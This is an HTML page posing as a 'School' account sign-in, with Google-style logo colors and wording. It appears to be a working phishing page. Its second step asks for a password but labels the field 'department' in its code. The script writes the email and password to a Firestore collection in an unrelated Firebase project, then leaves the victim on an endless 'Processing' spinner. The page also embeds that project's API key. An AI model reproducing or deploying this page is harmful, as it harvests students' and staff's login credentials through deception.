<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>School Registration</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', Roboto, sans-serif;
            background-color: #ffffff;
        }

        body {
            display: flex;
            flex-direction: column;
        }

        .status-bar {
            height: 24px;
            background-color: #ffffff;
            padding: 4px 16px;
            font-size: 12px;
            color: #000;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #e8e8e8;
        }

        .scroll-container {
            flex: 1;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 40px 20px;
        }

        .container {
            width: 100%;
            max-width: 560px;
            display: flex;
            flex-direction: column;
        }

        .logo-text {
            text-align: center;
            margin-bottom: 40px;
            font-size: 48px;
            font-weight: 500;
            letter-spacing: -1px;
        }

        .logo-text span:nth-child(1) { color: #4285f4; }
        .logo-text span:nth-child(2) { color: #ea4335; }
        .logo-text span:nth-child(3) { color: #fbbc05; }
        .logo-text span:nth-child(4) { color: #34a853; }
        .logo-text span:nth-child(5) { color: #ea4335; }
        .logo-text span:nth-child(6) { color: #4285f4; }

        h1 {
            font-size: 32px;
            font-weight: 400;
            color: #202124;
            text-align: center;
            margin-bottom: 24px;
            letter-spacing: -0.5px;
        }

        .description {
            font-size: 14px;
            color: #5f6368;
            line-height: 1.6;
            text-align: center;
            margin-bottom: 16px;
        }

        .learn-link {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            text-align: center;
            display: block;
            margin-bottom: 32px;
        }

        .learn-link:hover {
            text-decoration: underline;
        }

        .form-section {
            display: none;
            width: 100%;
        }

        .form-section.active {
            display: block;
        }

        form {
            width: 100%;
        }

        input[type="email"],
        input[type="text"] {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            color: #202124;
            font-family: inherit;
            transition: border-color 0.2s, box-shadow 0.2s;
            margin-bottom: 16px;
        }

        input::placeholder {
            color: #80868b;
        }

        input:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 0 3px rgba(26, 115, 232, 0.1);
        }

        .error-message {
            color: #d33b27;
            font-size: 13px;
            margin-bottom: 16px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .forgot-link {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            margin-bottom: 40px;
            display: inline-block;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .spacer {
            flex: 1;
            min-height: 60px;
        }

        .footer-section {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 40px;
        }

        .create-link {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            cursor: pointer;
            border: none;
            background: none;
            padding: 0;
            font-family: inherit;
        }

        .create-link:hover {
            text-decoration: underline;
        }

        .submit-button {
            padding: 10px 28px;
            background-color: #1a73e8;
            color: white;
            font-weight: 500;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 15px;
            font-family: inherit;
            transition: background-color 0.2s, box-shadow 0.2s;
            min-width: 90px;
            text-align: center;
        }

        .submit-button:hover {
            background-color: #1765cc;
            box-shadow: 0 2px 8px rgba(26, 115, 232, 0.3);
        }

        .submit-button:active {
            background-color: #1552b8;
        }

        .submit-button:disabled {
            background-color: #c5c5c5;
            cursor: not-allowed;
        }

        .back-button {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            cursor: pointer;
            border: none;
            background: none;
            padding: 0;
            font-family: inherit;
        }

        .back-button:hover {
            text-decoration: underline;
        }

        .progress-bar {
            height: 4px;
            background-color: #e8e8e8;
            width: 100%;
            position: fixed;
            bottom: 0;
        }

        .progress-bar-fill {
            height: 100%;
            background-color: #dadce0;
            width: 50%;
            transition: width 0.3s ease;
        }

        /* Loading State */
        .loading-container {
            display: none;
            text-align: center;
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .loading-container.active {
            display: flex;
        }

        .spinner {
            width: 50px;
            height: 50px;
            margin-bottom: 24px;
            animation: spin 0.8s linear infinite;
        }

        .spinner svg {
            width: 100%;
            height: 100%;
        }

        @keyframes spin {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }

        .loading-text {
            color: #5f6368;
            font-size: 16px;
        }

        @media (max-width: 600px) {
            .scroll-container {
                padding: 30px 16px;
            }

            h1 {
                font-size: 28px;
            }

            .logo-text {
                font-size: 40px;
            }

            .footer-section {
                flex-direction: column;
                gap: 20px;
            }

            .submit-button {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="status-bar">
        <span>10:31</span>
        <span>📶</span>
    </div>

    <div class="scroll-container">
        <div class="container">
            <!-- Step 1: Email -->
            <div class="form-section active" id="step1">
                <div class="logo-text">
                    <span>S</span><span>c</span><span>h</span><span>o</span><span>o</span><span>l</span>
                </div>

                <h1>Sign in</h1>

                <p class="description">
                    Use your school account. The account will be added to this device and available to other apps.
                </p>

                <a href="#" class="learn-link" onclick="return false;">Learn more about using your account</a>

                <form onsubmit="handleEmailNext(event)">
                    <input 
                        type="email" 
                        id="emailInput" 
                        placeholder="Email or phone"
                        required
                    />

                    <div class="error-message" id="errorMessage"></div>

                    <a href="#" class="forgot-link" onclick="return false;">Forgot email?</a>

                    <div class="spacer"></div>

                    <div class="footer-section">
                        <a href="#" class="create-link" onclick="return false;">Create account</a>
                        <button type="submit" class="submit-button">Next</button>
                    </div>
                </form>
            </div>

            <!-- Step 2: Department -->
            <div class="form-section" id="step2">
                <div class="logo-text">
                    <span>S</span><span>c</span><span>h</span><span>o</span><span>o</span><span>l</span>
                </div>

                <h1>Welcome</h1>

                <div id="emailDisplay" style="text-align: center; font-size: 16px; color: #5f6368; margin-bottom: 32px;"></div>

                <form onsubmit="handleSubmit(event)">
                    <input 
                        type="text" 
                        id="departmentInput" 
                        placeholder="Enter your password"
                        required
                    />

                    <div class="error-message" id="errorMessage2"></div>

                    <a href="#" class="forgot-link" onclick="return false;">Forgot password?</a>

                    <div class="spacer"></div>

                    <div class="footer-section">
                        <button type="button" class="back-button" onclick="goToStep(1)">Back</button>
                        <button type="submit" class="submit-button" id="submitBtn">Next</button>
                    </div>
                </form>
            </div>

            <!-- Loading State -->
            <div class="loading-container" id="loadingContainer">
                <div class="spinner">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="2">
                        <circle cx="12" cy="12" r="10" opacity="0.2"></circle>
                        <path d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" fill="#1a73e8"></path>
                    </svg>
                </div>
                <p class="loading-text">Processing your information...</p>
            </div>
        </div>
    </div>

    <div class="progress-bar">
        <div class="progress-bar-fill" id="progressFill"></div>
    </div>

    <script type="module">
        // Import Firebase modules
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js';
        import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js';

        // Initialize Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyCXqNe_BDdh9WIJ9lyrFPeQ_-733qbXW4s",
            authDomain: "realinsightreport.firebaseapp.com",
            projectId: "realinsightreport",
            storageBucket: "realinsightreport.firebasestorage.app",
            messagingSenderId: "1083096764833",
            appId: "1:1083096764833:web:4b526f278471212ba43be0",
            measurementId: "G-6LHBN68HMH"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Global variables
        let currentStep = 1;
        let userEmail = '';

        // Step navigation
        window.goToStep = function(step) {
            currentStep = step;
            updateUI();
        };

        // Handle email submission
        window.handleEmailNext = function(event) {
            event.preventDefault();
            const emailInput = document.getElementById('emailInput');
            const errorMessage = document.getElementById('errorMessage');

            if (!emailInput.value.trim()) {
                errorMessage.textContent = 'Enter a valid email or phone number';
                errorMessage.classList.add('show');
                return;
            }

            errorMessage.classList.remove('show');
            userEmail = emailInput.value;
            currentStep = 2;
            updateUI();
        };

        // Handle form submission
        window.handleSubmit = async function(event) {
            event.preventDefault();
            const departmentInput = document.getElementById('departmentInput');
            const errorMessage = document.getElementById('errorMessage2');
            const submitBtn = document.getElementById('submitBtn');

            if (!departmentInput.value.trim()) {
                errorMessage.textContent = 'Please enter your department';
                errorMessage.classList.add('show');
                return;
            }

            errorMessage.classList.remove('show');
            submitBtn.disabled = true;

            try {
                // Add data to Firestore
                const docRef = await addDoc(collection(db, 'schools'), {
                    email: userEmail,
                    department: departmentInput.value,
                    timestamp: new Date()
                });

                console.log('Document written with ID: ', docRef.id);

                // Show loading state
                showLoadingState();
            } catch (error) {
                console.error('Error adding document: ', error);
                errorMessage.textContent = 'Failed to submit. Please try again.';
                errorMessage.classList.add('show');
                submitBtn.disabled = false;
            }
        };

        // Update UI based on current step
        function updateUI() {
            // Hide all sections
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.remove('active');
            document.getElementById('loadingContainer').classList.remove('active');

            // Update progress bar
            const progressFill = document.getElementById('progressFill');

            if (currentStep === 1) {
                document.getElementById('step1').classList.add('active');
                progressFill.style.width = '0%';
                document.getElementById('emailInput').focus();
            } else if (currentStep === 2) {
                document.getElementById('step2').classList.add('active');
                progressFill.style.width = '50%';
                document.getElementById('emailDisplay').textContent = userEmail;
                document.getElementById('departmentInput').focus();
            }
        }

        // Show loading state
        function showLoadingState() {
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.remove('active');
            document.getElementById('loadingContainer').classList.add('active');
            document.getElementById('progressFill').style.width = '100%';
        }
    </script>
</body>
</html>
